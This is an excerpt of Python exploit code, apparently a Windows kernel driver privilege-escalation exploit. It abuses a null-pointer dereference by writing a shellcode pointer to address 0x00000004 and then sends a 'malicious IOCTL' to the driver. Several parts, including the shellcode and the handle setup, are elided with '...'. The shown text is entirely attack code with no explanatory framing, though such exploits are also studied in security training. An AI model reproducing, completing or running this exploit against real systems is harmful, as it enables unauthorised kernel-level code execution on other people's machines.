...
def nullalloc(shelladdr):
    ...
    copypointer = create_string_buffer(struct.pack("<L", shelladdr), 0x4)
    memmove(0x4, addressof(copypointer), 0x4)
    print "\t[+]Copied shellcode pointer to 0x00000004"

### Create buffer and send IOCTL ###
def trigger(hDevice, dwIoControlCode):
    print "[*]Sending malicious IOCTL..."
    lpInBuffer = "\x41\x41\x41\x41"
...
if __name__ == "__main__":
        ...
        nullalloc(shelladdr)
        trigger(gethandle(), ctl_code(0x80A))
